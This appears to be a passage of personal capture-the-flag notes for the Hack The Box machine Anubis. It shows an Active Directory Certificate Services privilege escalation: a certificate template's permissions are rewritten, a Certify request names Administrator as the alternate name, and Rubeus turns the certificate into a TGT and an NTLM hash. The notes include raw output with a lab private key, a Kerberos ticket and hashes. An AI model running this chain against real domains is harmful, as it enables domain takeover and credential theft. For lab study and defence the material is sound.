# Enumeration

### DiegoCruz is Part of webdevelopers Group

https://github.com/cfalta/PoshADCS/blob/master/README.md

```powershell
Get-ADCSTemplateACL -Name Web | ft AceQualifier,Identity                      

 AceQualifier Identity                  
 ------------ --------                  
AccessAllowed WINDCORP\Domain Admins    
AccessAllowed WINDCORP\Enterprise Admins
AccessAllowed WINDCORP\Domain Admins    
AccessAllowed WINDCORP\Enterprise Admins
AccessAllowed WINDCORP\Administrator    
AccessAllowed WINDCORP\webdevelopers    
AccessAllowed Authenticated Users       
```


Set-ADCSTemplate Permissions manually, since PoshADCS doesnt work because of UPN

```powershell
$Properties

Name                           Value                                                                                   
----                           -----                                                                                   
mspki-private-key-flag         256                                                                                     
mspki-enrollment-flag          0                                                                                       
mspki-certificate-name-flag    1                                                                                       
flags                          CLEAR                                                                                   
msPKI-Certificate-Applicati... {1.3.6.1.4.1.311.20.2.2, 1.3.6.1.5.5.7.3.2}                                             
pkiextendedkeyusage            {1.3.6.1.4.1.311.20.2.2, 1.3.6.1.5.5.7.3.2}                                             
pkidefaultkeyspec              1                                                                                       
pKIDefaultCSPs                 1,Microsoft Base Smart Card Crypto Provider


Set-ADCSTemplate -Name web -Properties $Properties -Force
```



# Issue Certificate with Certify.exe


```powershell
.\certify request /ca:earth.windcorp.htb\windcorp-CA /template:web /altname:Administrator

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA3sr3iIp0mZu6e2PDy6a+k8bJN5HVf0owwVNOHZb4rv0fBwGG
hiFXIyQLwNJ/PF/tGa/HZdnzQ5DkRpYsJ2LlfOcWKOj1FX4ruD2GtfPGpUvW3mpV
4K0jSyx1h0VJKYaqMF8iY0x6GL+kwYvrEbih40/DVFUY4Y4onr1q1xDDkZCxmm1+
0MqIEIT77wLOKOMeQ273fR9ylug4pEeLUDxyDNxXeZvK+OrqmUYcNAuDyW0H0NTT
4kwb72HNCq6FhM7R3DvtOL450kpy0d76zRrGXMIsba2aViIpXA7LnewlOgyUWa9J
AdvJH3rAFj5nlUJrmfjyTBmVwZqfScEcqA47wQIDAQABAoIBAQDEDIsCJgQw366b
wdCbtqFhXL3YHoZmupxooqvMsfsn0SmqepcsFM6e56tIBHNeZ3M29U1bvQyp2ihm
TOORzR7waFFBsq1oOlyyhcGy/09ASZpMofnr+a9jCT5qyHd3CT9dzXlvM+8FNC8A
+eTi9TvP0XKrFS8N3JC2DyyjD+dogOxRaFPpxCzgtOH5hpVYn4VZvtqELgPZVVzw
oISjPGT3xpxVAIWJ8Q2wTLhm/1ZR3ZI27VYW3ITL5d1CTdlBBguzG8sE7Ew2O5sk
UF9byuaSqfCFvx0T5phLAlsbGXAd769TJmmxgBpbuYwxmUmFpW62dvy/26ENyvpf
JD77JmuZAoGBAPsarHCf+5igiF/7g4Tt3gX4HO3yEM8K+QzCucTLQlFxVHy2DolJ
E9UcNLGH0u/sL3SQIpdoD+dBI1CIHk7EgO10RF7S04xMJ0veYvtrM9yxcleAmWAY
DNBo2UkJgrwmkhnZVrM60lb32JggjXZiPZGSS7TaXSv58tq7J/R9dBE3AoGBAOMi
++cJrqJIaMSeszOJNt/gjTDeW6f/WBv9Q8efFT18vANNkSJIcXU94XsQHliJEVga
x6VM4hXxXA3e0dMyes/rUhy/Etif8l6pWrlTGd8Wowy+fQVcLDdyIuasgSdqm+Yi
vtJPCpnHTnQnxlwtHqHQdxQGMaK1dscYezXlBvbHAoGAAJYSWvz0oGmXh+nVZ8UK
ZKcsoh2TjngvFqmJt3zl/byu/s+J/yYNhszXDqcLhgXeIn6HpiTXDKopQ/HdaD+r
MWK5GiOR3Nz8pn+xaXbZmyVK6Atj0EaeGQp1n2cHSBsq8iaAvlBf11YiylAhJGqc
TC+0P4rW9thRidMwB7EXSUcCgYAcYnzUbJNUWHQvTh3a7OTcqXU7jC4sGm7qYIYd
5jWDT5k3WHQwspjrK+aHuIXyTn7KYd5dO/RtBZKZcSULnZ1XanMCgKZcR/DD/6oE
yuvKw0txBkUdbF1iOHNAHIKvaFU/N0xdf981RID7ZxUU49aWJjUbXYLKcJ79VoPf
QlXSdQKBgH1evYYSBvyMXlbhc31ZgDOm27ItjM53F1TRmpR3xgSGqOCVvjM3rYY/
P71fQo70NrwmNKb2kqRW99fukEEhlAyOx9DEbI2CUY1JIOhxPepcewaeQHZHMZ7K
/MTN0D1LdjM++kXKYPIZeqzs7h7OZ60MrKCjnQsKYRINpDphZRhX
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIFwDCCBKigAwIBAgITMwAAAAQ321plvWKQ+wAAAAAABDANBgkqhkiG9w0BAQsF
ADBFMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYId2luZGNv
cnAxFDASBgNVBAMTC3dpbmRjb3JwLUNBMB4XDTIxMDgyMTEwMTcyNVoXDTIzMDgy
MTEwMjcyNVowWTETMBEGCgmSJomT8ixkARkWA2h0YjEYMBYGCgmSJomT8ixkARkW
CHdpbmRjb3JwMRMwEQYDVQQLEwpNYWluT2ZmaWNlMRMwEQYDVQQDEwpEaWVnbyBD
cnV6MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3sr3iIp0mZu6e2PD
y6a+k8bJN5HVf0owwVNOHZb4rv0fBwGGhiFXIyQLwNJ/PF/tGa/HZdnzQ5DkRpYs
J2LlfOcWKOj1FX4ruD2GtfPGpUvW3mpV4K0jSyx1h0VJKYaqMF8iY0x6GL+kwYvr
Ebih40/DVFUY4Y4onr1q1xDDkZCxmm1+0MqIEIT77wLOKOMeQ273fR9ylug4pEeL
UDxyDNxXeZvK+OrqmUYcNAuDyW0H0NTT4kwb72HNCq6FhM7R3DvtOL450kpy0d76
zRrGXMIsba2aViIpXA7LnewlOgyUWa9JAdvJH3rAFj5nlUJrmfjyTBmVwZqfScEc
qA47wQIDAQABo4ICkzCCAo8wOwYJKwYBBAGCNxUHBC4wLAYkKwYBBAGCNxUIsrAi
h4Xrf4bphxiFkKlUxdkzJoaox1ODlPQcAgFkAgECMB8GA1UdJQQYMBYGCCsGAQUF
BwMCBgorBgEEAYI3FAICMA4GA1UdDwEB/wQEAwIFoDApBgkrBgEEAYI3FQoEHDAa
MAoGCCsGAQUFBwMCMAwGCisGAQQBgjcUAgIwHQYDVR0OBBYEFFCPbggjWZDCmSW9
FQovgqP5dqycMCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJh
dG9yMB8GA1UdIwQYMBaAFBBQB/Z7ZTloO4v+uzi7R43NuP8YMIHIBgNVHR8EgcAw
gb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXdpbmRjb3JwLUNBLENOPWVhcnRoLENO
PUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
b25maWd1cmF0aW9uLERDPXdpbmRjb3JwLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9j
YXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQw
gb4GCCsGAQUFBwEBBIGxMIGuMIGrBggrBgEFBQcwAoaBnmxkYXA6Ly8vQ049d2lu
ZGNvcnAtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9d2luZGNvcnAsREM9aHRiP2NBQ2Vy
dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
MA0GCSqGSIb3DQEBCwUAA4IBAQAQhJ1qLJ5R7ePJPrHk9u2yYy/BuHeN7R+1op7G
O2osB9GQ2KCCfOTjVZJvIntBEwD23i7NaLG2OlXp4UFj5x6RGN8AQ0rIarxsBmXb
fy8sN3cHyT9b+orcKml+Vey71u3exRTfUSYiNuVTMT5fwNNHJU0ndMgLmq3XDYZN
npEa1cwQwzUfpgV7Fuzz8A2qI85Cj0KcNCgV8kaKJwrq+Wvuj7owmXezVhUuYJb0
a7YDvcKIne26ly9UQYx+pQSxw/bvYBw/LzieB4WJl5Kr7LeE7A+4lhBeQFz8tKcd
iIjcXPYrG0/on2SR3Ke6/Aj0o0oPGBPfAb8q7p7fot+z7Ffd
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

```



# Using Rubeus to get GT

```powershell
.\rubeus asktgt /user:Administrator /certificate:cert.pfx /getcredentials

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0 

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Diego Cruz, OU=MainOffice, DC=windcorp, DC=htb 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'windcorp.htb\Administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/windcorp.htb
  ServiceRealm             :  WINDCORP.HTB
  UserName                 :  Administrator
  UserRealm                :  WINDCORP.HTB
  StartTime                :  8/21/2021 1:41:13 PM
  EndTime                  :  8/21/2021 11:41:13 PM
  RenewTill                :  8/28/2021 1:41:13 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  3qouVD2J2nI/tiz21tAauw==
  ASREP (key)              :  FE74C194E9849B01B3DEDA2022143C45

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 3CCC18280610C6CA3156F995B5899E09
``` 

# Convert the Ticket to Ccache

```bash
impacket-ticketConverter administrator.kirbi administrator.ccache
export KRB5CCNAME=/root/Desktop/HTB/Anubis/administrator.ccache
```


# Create a tunel with Chisel, because Kerberos is not listening on external

![[Pasted image 20210821134856.png]]

![[Pasted image 20210821134908.png]]

![[Pasted image 20210821134838.png]]


# Alternatively use the Hash 

![[Pasted image 20210821123819.png]]

![[Pasted image 20210821123847.png]]
